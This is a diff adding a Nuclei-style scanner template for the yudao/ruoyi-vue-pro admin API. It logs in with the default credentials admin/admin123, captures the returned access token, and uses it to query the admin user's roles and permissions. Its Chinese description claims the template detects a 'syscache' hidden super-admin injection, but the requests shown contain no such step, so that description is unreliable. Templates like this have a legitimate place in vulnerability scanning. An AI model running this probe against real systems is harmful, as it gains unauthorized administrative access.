@@ -1,0 +1,61 @@
+id: yudao-syscache-admin
+
+info:
+  name: 芋道 yudao-ui 隐藏超管 syscache
+  author: survey-engine
+  severity: critical
+  description: >
+    检测芋道（ruoyi-vue-pro / yudao）/admin/system/auth/login 接口存在通过
+    syscache 注入隐藏超级管理员的条件；配合 yudao_hidden_admin_sql.py 完整利用。
+  tags: yudao,ruoyi,admin,syscache,auth-bypass
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/admin-api/system/auth/login"
+
+    headers:
+      Content-Type: application/json
+      tenant-id: "1"
+
+    body: '{"username":"admin","password":"admin123","captchaVerification":""}'
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"accessToken"'
+          - '"access-token"'
+          - '"code":0'
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - '"captchaEnable":false'
+          - '"captcha_enable":false'
+        condition: or
+
+    extractors:
+      - type: json
+        part: body
+        name: token
+        json:
+          - ".data.accessToken"
+          - ".data.access-token"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin-api/system/user/info"
+
+    headers:
+      Authorization: "Bearer {{token}}"
+      tenant-id: "1"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"roles"'
+          - '"permissions"'
